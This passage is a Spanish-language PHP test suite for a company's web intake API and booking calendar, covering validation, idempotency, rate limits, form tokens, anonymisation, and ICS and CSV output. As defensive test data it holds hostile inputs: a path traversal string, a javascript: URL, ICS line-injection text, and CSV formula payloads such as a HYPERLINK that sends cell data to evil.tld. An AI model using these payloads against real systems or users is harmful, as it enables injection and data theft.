   $limpio['consentimiento_hash'], hash('sha256', 'Acepto que Intellihelp use estos datos para responder mi consulta y coordinar la reunión, según el aviso de privacidad.'));
eq('y la versión aceptada', $limpio['consentimiento_version'], 'web-2026-11');
eq('el origen llega entero', [$limpio['origen']['pagina'], $limpio['origen']['canal'], $limpio['origen']['utm_campaign'], $limpio['origen']['visitas_landing']],
   ['/diagnostico/', 'Google Ads', 'diagnostico-it', 2]);
eq('novedades por defecto: no', api_validar_entrada($cuerpo([], ['novedades']), true)[0]['novedades'], false);

ok('campo desconocido arriba: error', isset($errores($cuerpo(['extra' => 1]))['extra']));
ok('campo desconocido en persona: error', isset($errores($cuerpo(['persona' => ['cargo' => 'Gerente']]))['persona.cargo']));
ok('campo desconocido en consentimiento: error', isset($errores($cuerpo(['consentimiento' => ['ip' => '1.2.3.4']]))['consentimiento.ip']));
ok('una consulta no acepta los campos de la reserva', isset($errores($cuerpo(), false)['tipo']));
eq('una consulta sin los campos de la reserva pasa', $errores($cuerpo([], ['tipo', 'vendedor', 'inicio']), false), []);
ok('sin persona: error', isset($errores($cuerpo([], ['persona']))['persona']));
ok('nombre de una letra: error', isset($errores($cuerpo(['persona' => ['nombre' => 'J']]))['nombre']));
ok('nombre sin letras: error', isset($errores($cuerpo(['persona' => ['nombre' => '12345']]))['nombre']));
ok('nombre en dos líneas: error', isset($errores($cuerpo(['persona' => ['nombre' => "Juana\nPrueba"]]))['nombre']));
ok('nombre que no es texto: error', isset($errores($cuerpo(['persona' => ['nombre' => ['Juana']]]))['nombre']));
ok('sin empresa: error (es obligatoria desde la web)', isset($errores($cuerpo(['persona' => ['empresa' => '']]))['empresa']));
ok('empresa de más de 200: error', isset($errores($cuerpo(['persona' => ['empresa' => str_repeat('a', 201)]]))['empresa']));
ok('correo inválido: error', isset($errores($cuerpo(['persona' => ['email' => 'juana@']]))['email']));
ok('correo de más de 190: error', isset($errores($cuerpo(['persona' => ['email' => str_repeat('a', 185) . '@ab.com']]))['email']));
ok('teléfono con letras: error', isset($errores($cuerpo(['persona' => ['telefono' => 'llamame']]))['telefono']));
eq('teléfono vacío: vale (es opcional)', $errores($cuerpo(['persona' => ['telefono' => '']])), []);
ok('servicio de más de 120: error', isset($errores($cuerpo(['persona' => ['servicio' => str_repeat('s', 121)]]))['servicio']));
ok('mensaje de más de 3000: error', isset($errores($cuerpo(['persona' => ['mensaje' => str_repeat('m', 3001)]]))['mensaje']));
eq('mensaje de 3000 justos: vale', $errores($cuerpo(['persona' => ['mensaje' => str_repeat('m', 3000)]])), []);
ok('sin aceptar el consentimiento: error', isset($errores($cuerpo(['consentimiento' => ['aceptado' => false]]))['consentimiento']));
ok('«true» como texto no es aceptar', isset($errores($cuerpo(['consentimiento' => ['aceptado' => 'true']]))['consentimiento']));
ok('sin versión del texto aceptado: error', isset($errores($cuerpo(['consentimiento' => ['version' => 'X']]))['consentimiento.version']));
ok('consentimiento de hace dos días: error',
   isset($errores($cuerpo(['consentimiento' => ['fecha' => date('c', time() - 2 * 86400)]]))['consentimiento.fecha']));
ok('consentimiento sin fecha: error', isset($errores($cuerpo([], ['consentimiento.fecha']))['consentimiento.fecha']));
ok('novedades que no es booleano: error', isset($errores($cuerpo(['novedades' => 'si']))['novedades']));
ok('reserva sin inicio: error', isset($errores($cuerpo([], ['inicio']))['inicio']));
ok('inicio sin zona horaria: error (no se adivina)', isset($errores($cuerpo(['inicio' => '2026-11-03 09:30']))['inicio']));
ok('tipo con espacios o mayúsculas: error', isset($errores($cuerpo(['tipo' => 'Diag Nostico']))['tipo']));
ok('vendedor con espacios: error', isset($errores($cuerpo(['vendedor' => 'Carlos Baldelli']))['vendedor']));

// El origen nunca hace fallar el pedido: lo raro se guarda vacío.
[$lo, $eo] = api_validar_entrada($cuerpo(['origen' => [
    'pagina' => '/../etc/passwd', 'landing' => '//otro.sitio/x', 'canal' => "Google\nAds",
    'referrer' => 'javascript:alert(1)', 'gclid' => 'con espacios', 'visitas_landing' => 1000,
    'desconocido' => 'x',
]]), true);
eq('un origen raro no genera errores', $eo, []);
eq('página con «..»: vacía', $lo['origen']['pagina'], '');
eq('landing con «//»: vacía', $lo['origen']['landing'], '');
eq('canal en dos líneas: vacío', $lo['origen']['canal'], '');
eq('referrer que no es http(s): vacío', $lo['origen']['referrer'], '');
eq('gclid con espacios: vacío', $lo['origen']['gclid'], '');
eq('visitas fuera de rango: sin dato', $lo['origen']['visitas_landing'], null);
ok('las claves de origen desconocidas se ignoran', !array_key_exists('desconocido', $lo['origen']));

echo "== API v1: idempotencia (la misma reserva no se toma dos veces) ==\n";
$h1 = api_cuerpo_hash(json_decode('{"b":1,"a":{"y":2,"x":[1,2]}}', true));
$h2 = api_cuerpo_hash(json_decode("{ \"a\" : { \"x\" : [1, 2], \"y\" : 2 }, \"b\" : 1 }", true));
eq('el mismo pedido con otro orden y espaciado da la misma huella', $h1, $h2);
ok('otro contenido, otra huella', $h1 !== api_cuerpo_hash(json_decode('{"b":1,"a":{"y":3,"x":[1,2]}}', true)));
ok('el orden de una lista sí importa', $h1 !== api_cuerpo_hash(json_decode('{"b":1,"a":{"y":2,"x":[2,1]}}', true)));

$guardada = api_respuesta_guardable(201, ['ok' => true, 'repetida' => false, 'entrada_id' => 128,
                                          'reserva' => ['id' => 57, 'estado' => 'confirmada']]);
[$c, $dat] = api_previa_respuesta(['id' => 128, 'cuerpo_hash' => $h1, 'estado' => 'ok', 'respuesta' => $guardada], $h1);
eq('reintento de un pedido ya resuelto: 200', $c, 200);
eq('con la respuesta original', [$dat['entrada_id'], $dat['reserva']['id']], [128, 57]);
eq('marcada como repetida', $dat['repetida'], true);
[$c, $dat] = api_previa_respuesta(['id' => 128, 'cuerpo_hash' => $h1, 'estado' => 'procesando', 'respuesta' => null], $h1);
eq('reintento mientras se procesa: 409 en_proceso', [$c, $dat['error']], [409, 'en_proceso']);
[$c, $dat] = api_previa_respuesta(['id' => 128, 'cuerpo_hash' => $h1, 'estado' => 'ok', 'respuesta' => $guardada], hash('sha256', 'otro'));
eq('misma clave con otro pedido: 409 idempotencia_reusada', [$c, $dat['error']], [409, 'idempotencia_reusada']);
[$c, $dat] = api_previa_respuesta(['id' => 128, 'cuerpo_hash' => $h1, 'estado' => 'ok', 'respuesta' => null], $h1);
eq('resuelta pero sin la respuesta guardada: 200 igual', [$c, $dat['repetida'], $dat['entrada_id']], [200, true, 128]);
$descartada = api_respuesta_guardable(200, ['ok' => true, 'repetida' => true, 'entrada_id' => 90]);
[$c, $dat] = api_previa_respuesta(['id' => 129, 'cuerpo_hash' => $h1, 'estado' => 'descartada', 'respuesta' => $descartada], $h1);
eq('reintento de una consulta duplicada: la misma respuesta', [$c, $dat['entrada_id']], [200, 90]);

echo "== Empresas y correos que llegan desde la web ==\n";
eq('«ACME S.A.» → acme', empresa_clave('ACME S.A.'), 'acme');
eq('«Acme SA» → acme', empresa_clave('Acme SA'), 'acme');
eq('«acme, s. a.» → acme', empresa_clave('acme, s. a.'), 'acme');
eq('«Sasa SRL» no se confunde con «Sa»', empresa_clave('Sasa SRL'), 'sasa');
eq('una empresa que se llama «Sa» sigue siendo «sa»', empresa_clave('Sa'), 'sa');
eq('«Distribuidora del Sur S.A.I.C.»', empresa_clave('Distribuidora del Sur S.A.I.C.'), 'distribuidora del sur');
eq('acentos y mayúsculas no cuentan', empresa_clave('Café Martínez S.R.L.'), 'cafe martinez');
eq('casilla gratuita: sin dominio', email_dominio_corporativo('juana@gmail.com'), null);
eq('casilla de proveedor de internet: sin dominio', email_dominio_corporativo('juana@fibertel.com.ar'), null);
eq('correo corporativo: su dominio', email_dominio_corporativo('Juana@Empresa-Prueba.com.ar'), 'empresa-prueba.com.ar');
eq('correo inválido: sin dominio', email_dominio_corporativo('juana@'), null);
eq('dominio reservado para ejemplos: sin dominio', email_dominio_corporativo('juana.prueba@example.com'), null);
eq('dominio de prueba: sin dominio', email_dominio_corporativo('juana@empresa.test'), null);
eq('un dominio que sólo se parece a example: es corporativo', email_dominio_corporativo('juana@myexample.com'), 'myexample.com');
eq('la línea de origen para el CRM',
   entrada_web_resumen(['pagina' => '/diagnostico/', 'canal' => 'Google Ads', 'utm_source' => 'google',
                        'utm_medium' => 'cpc', 'utm_campaign' => 'diagnostico-it', 'visitas_landing' => 2]),
   'Llegó desde /diagnostico/ · canal Google Ads · campaña diagnostico-it (google / cpc) · segunda visita a la landing');
eq('sin datos de origen dice al menos que vino de la web', entrada_web_resumen([]), 'Llegó desde la web');
eq('consulta del viernes: se contesta el lunes a las 12',
   entrada_web_vencimiento(strtotime('2026-10-30 15:00:00')), '2026-11-02 12:00:00');
eq('consulta del miércoles: el jueves a las 12',
   entrada_web_vencimiento(strtotime('2026-10-28 09:00:00')), '2026-10-29 12:00:00');
$ipH = ip_hash('190.2.3.4');
ok('la IP se guarda como hash de 64 hex', is_string($ipH) && preg_match('/^[0-9a-f]{64}$/', $ipH) === 1);
ok('y no es el SHA-256 pelado (lleva el secreto de la instalación)', $ipH !== hash('sha256', '190.2.3.4'));
eq('sin IP no hay hash', ip_hash(''), null);

echo "== Agenda: ventana, horarios y token del formulario ==\n";
$tipoP = ['id' => 7, 'zona_horaria' => 'America/Argentina/Buenos_Aires', 'ventana_dias' => 21,
          'duracion_min' => 30, 'margen_min' => 15, 'aviso_min_horas' => 2];
$lunes10 = (new DateTimeImmutable('2026-11-02 10:00:00', new DateTimeZone('America/Argentina/Buenos_Aires')))->getTimestamp();
[$tMin, $tMax, $fechas] = agenda_ventana($tipoP, '2026-11-02', '2026-11-04', $lunes10);
eq('tres días pedidos, tres días', $fechas, ['2026-11-02', '2026-11-03', '2026-11-04']);
eq('la consulta a Google llega al FINAL del último día (antes cortaba al comienzo)', $tMax,
   (new DateTimeImmutable('2026-11-05 00:00:00', new DateTimeZone('America/Argentina/Buenos_Aires')))->getTimestamp());
eq('y no empieza antes de ahora', $tMin, $lunes10);
[, , $fechas] = agenda_ventana($tipoP, '2026-10-01', '2026-11-03', $lunes10);
eq('un «desde» pasado arranca hoy', $fechas[0] ?? null, '2026-11-02');
[, , $fechas] = agenda_ventana(['ventana_dias' => 90] + $tipoP, '2026-11-02', '2027-02-01', $lunes10);
eq('nunca más de 31 días por consulta', count($fechas), 31);
[, , $fechas] = agenda_ventana($tipoP, '2026-11-02', '2027-02-01', $lunes10);
eq('ni más allá de la ventana del tipo', end($fechas), '2026-11-23');
[, , $fechas] = agenda_ventana($tipoP, '2026-11-05', '2026-11-03', $lunes10);
eq('rango invertido: ningún día', $fechas, []);

$zBA = new DateTimeZone('America/Argentina/Buenos_Aires');
$hBA = static fn(string $h): int => (new DateTimeImmutable('2026-11-03 ' . $h, $zBA))->getTimestamp();
$slots = agenda_slots_dia('2026-11-03', [['09:00', '12:00']], 1800, 900, 0, [[$hBA('10:00'), $hBA('10:30')]], $zBA);
eq('con una reunión de 10 a 10:30 y 15 min de margen quedan 9, 11 y 11:30',
   $slots, [$hBA('09:00'), $hBA('11:00'), $hBA('11:30')]);
$slots = agenda_slots_dia('2026-11-03', [['09:00', '12:00']], 1800, 900, $hBA('11:00'), [[$hBA('10:00'), $hBA('10:30')]], $zBA);
eq('la antelación mínima saca los de antes', $slots, [$hBA('11:00'), $hBA('11:30')]);
eq('la reunión entera tiene que entrar en la franja',
   agenda_slots_dia('2026-11-03', [['09:00', '10:15']], 1800, 0, 0, [], $zBA), [$hBA('09:00'), $hBA('09:30')]);
$mx = agenda_slots_dia('2026-11-03', [['09:00', '09:30']], 1800, 0, 0, [], 'America/Mexico_City');
eq('el horario se lee en la zona del vendedor', $mx, [(new DateTimeImmutable('2026-11-03 09:00', new DateTimeZone('America/Mexico_City')))->getTimestamp()]);
eq('una fecha mal escrita no da horarios', agenda_slots_dia('2026-02-30', [['09:00', '12:00']], 1800, 0, 0, [], $zBA), []);

$tokenCon = static function (int $tipoId, int $ts, string $uso = 'reservar', string $nonce = '0123456789abcdef'): string {
    return $tipoId . '.' . $ts . '.' . $nonce . '.'
         . hash_hmac('sha256', 'agenda-form|' . $uso . '|' . $tipoId . '|' . $ts . '|' . $nonce, crm_secret());
};
$m = null;
ok('token recién generado: demasiado rápido para una persona', !agenda_form_token_valido(agenda_form_token(7), 7, $m) && $m === 'rapido');
ok('token de hace 10 s: válido', agenda_form_token_valido($tokenCon(7, time() - 10), 7, $m));
ok('token de hace más de 2 h: vencido', !agenda_form_token_valido($tokenCon(7, time() - 7201), 7, $m) && $m === 'vencido');
$bueno    = $tokenCon(7, time() - 10);
$alterado = substr($bueno, 0, -1) . (substr($bueno, -1) === 'f' ? 'e' : 'f');
ok('token alterado: inválido', !agenda_form_token_valido($alterado, 7, $m) && $m === 'invalido');
ok('token de otro tipo de reunión: inválido', !agenda_form_token_valido($tokenCon(8, time() - 10), 7, $m) && $m === 'invalido');
ok('el de cancelar no sirve para reservar', !agenda_form_token_valido($tokenCon(7, time() - 10, 'cancelar'), 7, $m));
ok('basura: inválido', !agenda_form_token_valido('hola', 7, $m) && $m === 'invalido');
$viejo = 7 . '.' . (time() - 10) . '.' . hash_hmac('sha256', 'agenda-form|reservar|7|' . (time() - 10), crm_secret());
ok('el formato de antes (sin número al azar): inválido', !agenda_form_token_valido($viejo, 7, $m) && $m === 'invalido');
$t1 = agenda_form_token(7);
$t2 = agenda_form_token(7);
ok('dos tokens del mismo segundo son distintos (cada uno sirve una vez)', $t1 !== $t2);
$otroNonce = $tokenCon(7, time() - 10, 'reservar', 'fedcba9876543210');
$cambiado  = implode('.', array_replace(explode('.', $otroNonce), [2 => '0123456789abcdef']));
ok('cambiar el número al azar invalida la firma', !agenda_form_token_valido($cambiado, 7, $m) && $m === 'invalido');

echo "== Agenda: cobertura por vacaciones ==\n";
$cobJson = json_encode([
    ['tipo_id' => 4, 'usuario_id' => 4, 'desde' => '2026-11-09', 'hasta' => '2026-11-24'],
    ['tipo_id' => 9, 'usuario_id' => 5, 'desde' => '2026-11-01', 'hasta' => '2026-11-30'],
    ['tipo_id' => 4, 'usuario_id' => 0, 'desde' => '2026-12-01', 'hasta' => '2026-12-05'],
    ['tipo_id' => 4, 'usuario_id' => 6, 'desde' => '2026-12-10', 'hasta' => '2026-12-01'],
    ['tipo_id' => 4, 'usuario_id' => 6, 'desde' => '10/12/2026', 'hasta' => '2026-12-20'],
    'basura',
]);
$cob = agenda_coberturas_leer($cobJson, 4);
eq('sólo las coberturas válidas de ese tipo', $cob, [['usuario_id' => 4, 'desde' => '2026-11-09', 'hasta' => '2026-11-24']]);
eq('ajuste vacío o roto: ninguna cobertura', [agenda_coberturas_leer('', 4), agenda_coberturas_leer('{x', 4)], [[], []]);
eq('el día antes de las vacaciones atiende el dueño', agenda_cobertura_del_dia($cob, '2026-11-08'), null);
eq('el primer día cubre otro', agenda_cobertura_del_dia($cob, '2026-11-09'), 4);
eq('el último día también (las fechas van incluidas)', agenda_cobertura_del_dia($cob, '2026-11-24'), 4);
eq('el día después vuelve solo al dueño', agenda_cobertura_del_dia($cob, '2026-11-25'), null);

// ------------------------------------------------------------
//  Lo que depende de la base: idempotencia, duplicados y límites.
//
//  Corre contra una base SQLite en memoria con las mismas tablas, para no
//  necesitar el servidor. Las pocas cosas de MariaDB que usan estas
//  consultas (NOW(), INTERVAL, <=>, ON DUPLICATE KEY) se traducen al vuelo.
//  Si el PHP no tiene pdo_sqlite, el bloque se saltea y lo dice.
// ------------------------------------------------------------
echo "== Base en memoria: idempotencia, duplicados y límite de envíos ==\n";
if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
    echo "  (salteada: este PHP no tiene pdo_sqlite)\n";
} else {
    function db(): PDO
    {
        static $pdo = null;
        if ($pdo) { return $pdo; }
        $pdo = new PDO('sqlite::memory:', null, null, [
            PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]);
        // La hora la pone PHP, en la zona de la instalación, como hace MariaDB.
        $pdo->sqliteCreateFunction('ahora', fn() => date('Y-m-d H:i:s'), 0);
        $pdo->sqliteCreateFunction('ahora_menos', fn($s) => date('Y-m-d H:i:s', time() - (int)$s), 1);
        $pdo->exec("CREATE TABLE api_limites (clave TEXT NOT NULL, ventana INTEGER NOT NULL,
                        conteo INTEGER NOT NULL DEFAULT 0, vence_en TEXT NOT NULL, PRIMARY KEY (clave, ventana))");
        $pdo->exec("CREATE TABLE entradas_web (
            id INTEGER PRIMARY KEY AUTOINCREMENT, idempotencia TEXT NOT NULL, cuerpo_hash TEXT, token_id INTEGER,
            tipo TEXT NOT NULL, estado TEXT NOT NULL DEFAULT 'procesando', error TEXT, respuesta TEXT,
            nombre TEXT NOT NULL, empresa TEXT, email TEXT NOT NULL, telefono TEXT, servicio TEXT, mensaje TEXT,
            novedades INTEGER NOT NULL DEFAULT 0, consentimiento_en TEXT NOT NULL, consentimiento_version TEXT NOT NULL,
            consentimiento_hash TEXT, origen_pagina TEXT, canal TEXT, utm_source TEXT, utm_medium TEXT,
            utm_campaign TEXT, utm_term TEXT, utm_content TEXT, gclid TEXT, li_fat_id TEXT, referrer TEXT,
            landing TEXT, visitas_landing INTEGER, ip_hash TEXT, tipo_reunion_id INTEGER, inicio_pedido TEXT,
            propietario_id INTEGER, contacto_id INTEGER, cuenta_id INTEGER, actividad_id INTEGER, nota_id INTEGER,
            reserva_id INTEGER, creado_en TEXT, actualizado_en TEXT,
            UNIQUE (token_id, idempotencia))");
        $pdo->exec("CREATE TRIGGER ew_creado AFTER INSERT ON entradas_web WHEN NEW.creado_en IS NULL
                    BEGIN UPDATE entradas_web SET creado_en = ahora() WHERE id = NEW.id; END");
        return $pdo;
    }
    function sqlite_traducir(string $sql): string
    {
        $mult = ['MINUTE' => 60, 'HOUR' => 3600, 'DAY' => 86400];
        $sql = (string) preg_replace_callback('/NOW\(\)\s*-\s*INTERVAL\s+(\?|\d+)\s+(MINUTE|HOUR|DAY)/i',
            fn($m) => 'ahora_menos(' . $m[1] . ' * ' . $mult[strtoupper($m[2])] . ')', $sql);
        $sql = (string) preg_replace('/\bNOW\(\)/i', 'ahora()', $sql);
        $sql = str_replace('<=>', 'IS', $sql);
        $sql = (string) preg_replace('/^\s*INSERT IGNORE\b/i', 'INSERT OR IGNORE', $sql);
        $sql = (string) preg_replace('/ON DUPLICATE KEY UPDATE/i', 'ON CONFLICT (clave, ventana) DO UPDATE SET', $sql);
        return (string) preg_replace('/^(\s*DELETE\b.*?)\s+LIMIT\s+\d+\s*$/is', '$1', $sql);
    }
    function q(string $sql, array $params = []): PDOStatement
    {
        try {
            $st = db()->prepare(sqlite_traducir($sql));
            $st->execute(array_values($params));
            return $st;
        } catch (PDOException $e) {
            // Clave única repetida: MariaDB la informa con el código 1062, y es
            // el que mira entrada_web_guardar().
            if (str_contains($e->getMessage(), 'UNIQUE constraint failed')) {
                $dup = new PDOException('Duplicate entry', 23000);
                $dup->errorInfo = ['23000', 1062, 'Duplicate entry'];
                throw $dup;
            }
            throw $e;
        }
    }
    function q1(string $sql, array $params = []): ?array { $f = q($sql, $params)->fetch(); return $f === false ? null : $f; }
    function qv(string $sql, array $params = []) { return q($sql, $params)->fetchColumn(); }
    function last_id(): int { return (int) db()->lastInsertId(); }
    if (!function_exists('setting_get')) {
        function setting_get(string $clave, ?string $def = null): ?string { return $def; }
    }

    $fila = static fn(array $extra = []): array => $extra + [
        'idempotencia' => 'web-prueba-0000000001', 'cuerpo_hash' => $h1, 'token_id' => 1, 'tipo' => 'reserva',
        'nombre' => 'Juana Prueba', 'empresa' => 'Empresa de Prueba SRL', 'email' => 'bsierra@intellihelp.tech',
        'servicio' => 'Soporte IT', 'mensaje' => 'Hola', 'novedades' => false,
        'consentimiento_en' => date('Y-m-d H:i:s'), 'consentimiento_version' => 'web-2026-11',
        'origen' => ['pagina' => '/diagnostico/', 'canal' => 'Google Ads', 'visitas_landing' => 2],
        'tipo_reunion_id' => 3, 'inicio_pedido' => 1793709000,
    ];

    // ---- Idempotencia ----
    $previa = null;
    $id1 = entrada_web_guardar($fila(), $previa);
    ok('la primera vez se guarda la entrada', $id1 > 0 && $previa === null);
    $e1 = q1('SELECT * FROM entradas_web WHERE id = ?', [$id1]);
    eq('nace «procesando»', $e1['estado'], 'procesando');
    eq('el origen anidado queda en sus columnas', [$e1['origen_pagina'], $e1['canal'], (int)$e1['visitas_landing']],
       ['/diagnostico/', 'Google Ads', 2]);
    eq('el inicio pedido se guarda como fecha', $e1['inicio_pedido'], date('Y-m-d H:i:s', 1793709000));
    $id2 = entrada_web_guardar($fila(), $previa);
    ok('la misma clave otra vez NO crea otra fila', $id2 === 0 && (int)($previa['id'] ?? 0) === $id1);
    eq('y el reintento en curso recibe 409 en_proceso', api_previa_respuesta($previa, $h1)[1]['error'] ?? null, 'en_proceso');
    $resp = ['ok' => true, 'repetida' => false, 'entrada_id' => $id1, 'reserva' => ['id' => 57]];
    entrada_web_actualizar($id1, ['estado' => 'ok', 'reserva_id' => 57, 'respuesta' => api_respuesta_guardable(201, $resp)]);
    entrada_web_guardar($fila(), $previa);
    [$c, $dat] = api_previa_respuesta($previa, $h1);
    eq('ya resuelta: 200 con la misma reserva', [$c, $dat['reserva']['id'] ?? null, $dat['repetida']], [200, 57, true]);
    eq('con otro cuerpo: 409 idempotencia_reusada', api_previa_respuesta($previa, hash('sha256', 'x'))[1]['error'], 'idempotencia_reusada');
    ok('la misma clave de idempotencia con OTRA clave de API es otra entrada', entrada_web_guardar($fila(['token_id' => 2]), $previa) > 0);
    eq('las de la agenda pública (sin clave de API) no chocan entre sí',
       [entrada_web_guardar($fila(['token_id' => null, 'idempotencia' => null])) > 0,
        entrada_web_guardar($fila(['token_id' => null, 'idempotencia' => null])) > 0], [true, true]);

    // Horario tomado: la web vuelve a mandar con la MISMA clave y otro horario.
    $idE = entrada_web_guardar($fila(['idempotencia' => 'web-prueba-0000000002']));
    entrada_web_actualizar($idE, ['estado' => 'error', 'error' => 'horario_tomado:inicio']);
    $hNuevo = hash('sha256', 'otro horario');
    ok('una entrada con error se retoma', entrada_web_retomar($idE, $fila(['cuerpo_hash' => $hNuevo, 'inicio_pedido' => 1793710800])));
    $eE = q1('SELECT * FROM entradas_web WHERE id = ?', [$idE]);
    eq('vuelve a «procesando», con el pedido nuevo', [$eE['estado'], $eE['error'], $eE['cuerpo_hash'], $eE['inicio_pedido']],
       ['procesando', null, $hNuevo, date('Y-m-d H:i:s', 1793710800)]);
    ok('y dos reintentos simultáneos no la retoman los dos', !entrada_web_retomar($idE, $fila()));

    // ---- Consultas duplicadas ----
    $con = static fn(string $idem, array $extra = []): array => $fila($extra + [
        'idempotencia' => $idem, 'tipo' => 'consulta', 'tipo_reunion_id' => null, 'inicio_pedido' => null,
        'servicio' => 'Ciberseguridad', 'mensaje' => 'Queremos una auditoría',
    ]);
    $idC = entrada_web_guardar($con('web-consulta-000000001'));
    entrada_web_actualizar($idC, ['estado' => 'ok']);
    $d = ['email' => 'BSierra@Intellihelp.tech', 'servicio' => 'Ciberseguridad', 'mensaje' => 'Queremos una auditoría'];
    eq('la misma consulta a los pocos minutos es duplicada', entrada_web_duplicada($d, 1, 'web-consulta-000000002'), $idC);
    eq('un reintento del mismo pedido no es «duplicado» de sí mismo', entrada_web_duplicada($d, 1, 'web-consulta-000000001'), 0);
    eq('con otro mensaje no es duplicada', entrada_web_duplicada(['mensaje' => 'Otra cosa'] + $d, 1, 'web-consulta-000000003'), 0);
    eq('con otro servicio tampoco', entrada_web_duplicada(['servicio' => 'Redes'] + $d, 1, 'web-consulta-000000003'), 0);
    eq('ni de otra persona', entrada_web_duplicada(['email' => 'otra@empresa-prueba.com.ar'] + $d, 1, 'web-consulta-000000003'), 0);
    q('UPDATE entradas_web SET creado_en = ? WHERE id = ?', [date('Y-m-d H:i:s', time() - 31 * 60), $idC]);
    eq('pasada la media hora ya no cuenta como duplicada', entrada_web_duplicada($d, 1, 'web-consulta-000000003'), 0);
    q('UPDATE entradas_web SET creado_en = ?, estado = ? WHERE id = ?', [date('Y-m-d H:i:s'), 'error', $idC]);
    eq('una que terminó con error no frena a la siguiente', entrada_web_duplicada($d, 1, 'web-consulta-000000003'), 0);
    $idR = entrada_web_guardar($con('web-consulta-000000004', ['tipo' => 'reserva']));
    entrada_web_actualizar($idR, ['estado' => 'ok']);
    eq('una reserva no hace duplicada a una consulta', entrada_web_duplicada($d, 1, 'web-consulta-000000005'), 0);

    // ---- Límite de envíos ----
    $r = [];
    for ($i = 0; $i < 4; $i++) { $r[] = limite_superado('ip:prueba:reserva:3600', 3, 3600); }
    eq('tres reservas por hora pasan, la cuarta no', $r, [false, false, false, true]);
    ok('el contador es por clave: otro visitante no se ve afectado', !limite_superado('ip:otro:reserva:3600', 3, 3600));
    ok('ni otra ventana del mismo visitante', !limite_superado('ip:prueba:reserva:86400', 6, 86400));
    $espera = limite_espera(3600);
    ok('Retry-After entre 1 s y una hora', $espera >= 1 && $espera <= 3600);
    q("INSERT INTO api_limites (clave, ventana, conteo, vence_en) VALUES ('viejo', 1, 9, '2000-01-01 00:00:00')");
    for ($i = 0; $i < 1000 && qv("SELECT COUNT(*) FROM api_limites WHERE clave = 'viejo'"); $i++) {
        limite_superado('ip:purga:' . $i, 1000, 60);
    }
    ok('los contadores vencidos se purgan solos de vez en cuando', !qv("SELECT COUNT(*) FROM api_limites WHERE clave = 'viejo'"));

    // ---- Anonimización (Ley 25.326) ----
    $idViejo = entrada_web_guardar($con('web-consulta-000000010'));
    $idConContacto = entrada_web_guardar($con('web-consulta-000000011'));
    entrada_web_actualizar($idConContacto, ['estado' => 'ok', 'contacto_id' => 5]);
    q('UPDATE entradas_web SET creado_en = ? WHERE id IN (?, ?)', [date('Y-m-d H:i:s', time() - 61 * 86400), $idViejo, $idConContacto]);
    entradas_web_anonimizar(60);
    $v = q1('SELECT * FROM entradas_web WHERE id = ?', [$idViejo]);
    eq('una entrada vieja sin contacto pierde los datos personales',
       [$v['nombre'], $v['email'], $v['empresa'], $v['mensaje'], $v['ip_hash']], ['(borrado)', '', null, null, null]);
    eq('pero conserva el canal y la página', [$v['canal'], $v['origen_pagina']], ['Google Ads', '/diagnostico/']);
    eq('la que tiene contacto queda igual', qv('SELECT nombre FROM entradas_web WHERE id = ?', [$idConContacto]), 'Juana Prueba');

    // ---- Invitación: un solo identificador para toda la vida de la reunión ----
    $res = ['id' => 7, 'token' => str_repeat('a', 32), 'inicia_el' => '2026-11-03 09:30:00', 'termina_el' => '2026-11-03 10:00:00',
            'invitado_nombre' => 'Juana Prueba', 'invitado_email' => 'bsierra@intellihelp.tech', 'meet_url' => '',
            'comentario' => '', 'ics_uid' => 'abc123@google.com', 'ics_secuencia' => 2];
    $tipoIcs = ['nombre' => 'Reunión de diagnóstico', 'usuario' => 'Brian Sierra', 'usuario_email' => 'bsierra@intellihelp.tech'];
    $ics = str_replace("\r\n ", '', agenda_ics($res, $tipoIcs));
    contiene('la invitación usa el identificador del evento de Google', $ics, "\r\nUID:abc123@google.com\r\n");
    contiene('y la secuencia guardada', $ics, "\r\nSEQUENCE:2\r\n");
    contiene('trae el enlace para cambiar el horario', $ics, 'r/mover?t=' . str_repeat('a', 32));
    $icsViejo = str_replace("\r\n ", '', agenda_ics(['ics_uid' => null, 'ics_secuencia' => null] + $res, $tipoIcs));
    contiene('sin identificador guardado usa el de siempre', $icsViejo, 'UID:reserva-7-' . str_repeat('a', 32) . '@intellihelp.tech');
    $icsBaja = str_replace("\r\n ", '', agenda_ics(['ics_secuencia' => 3] + $res, $tipoIcs, 'CANCEL'));
    contiene('la cancelación pisa la misma invitación', $icsBaja, "\r\nUID:abc123@google.com\r\n");
    contiene('con la secuencia siguiente', $icsBaja, "\r\nSEQUENCE:3\r\n");
    no_contiene('y sin enlace para mover lo que ya no existe', $icsBaja, 'r/mover');

    // ---- Invitación: lo que escribió el visitante no entra al formato ----
    $icsRaro = str_replace("\r\n ", '', agenda_ics(['invitado_nombre' => 'Pérez, Juan: mailto:otro@evil.tld',
        'comentario' => "Hola\rLOCATION:https://evil.tld\r\nATTENDEE:mailto:x@evil.tld"] + $res, $tipoIcs));
    contiene('el nombre va entre comillas en CN', $icsRaro, 'ATTENDEE;CN="Pérez, Juan: mailto:otro@evil.tld";ROLE=');
    no_contiene('el comentario del visitante no va en la invitación', $icsRaro, 'evil.tld/');
    eq('ninguna línea de la invitación queda inyectada',
       count(array_filter(explode("\r\n", $icsRaro), fn($l) => str_starts_with($l, 'LOCATION:'))), 1);
    eq('ni un retorno suelto adentro', substr_count($icsRaro, "\r"), substr_count($icsRaro, "\r\n"));

    // ---- Token de formulario: una sola vez ----
    $tUnico = $tokenCon(7, time() - 10, 'reservar', bin2hex(random_bytes(8)));
    ok('token nuevo: sirve la primera vez', agenda_form_token_valido($tUnico, 7, $m, 'reservar', true));
    ok('la segunda vez no', !agenda_form_token_valido($tUnico, 7, $m, 'reservar', true) && $m === 'usado');

    // ---- Firma de una escritura: una sola vez ----
    $firmaX = hash('sha256', random_bytes(16));
    ok('una firma nueva no figura como usada', !api_firma_usada($firmaX));
    ok('la misma firma repetida sí', api_firma_usada($firmaX));
}

// ---- Exportación CSV: nada que la planilla tome como fórmula ----
eq('una fórmula queda como texto', csv_celda('=HYPERLINK("https://evil.tld/?d="&E2;"Ver")'),
   "'=HYPERLINK(\"https://evil.tld/?d=\"&E2;\"Ver\")");
eq('también con + - @', [csv_celda('+cmd|x'), csv_celda('-1+cmd|x'), csv_celda('@SUM(A1)')], ["'+cmd|x", "'-1+cmd|x", "'@SUM(A1)"]);
eq('un teléfono con + queda igual', csv_celda('+54 11 5555-0000'), '+54 11 5555-0000');
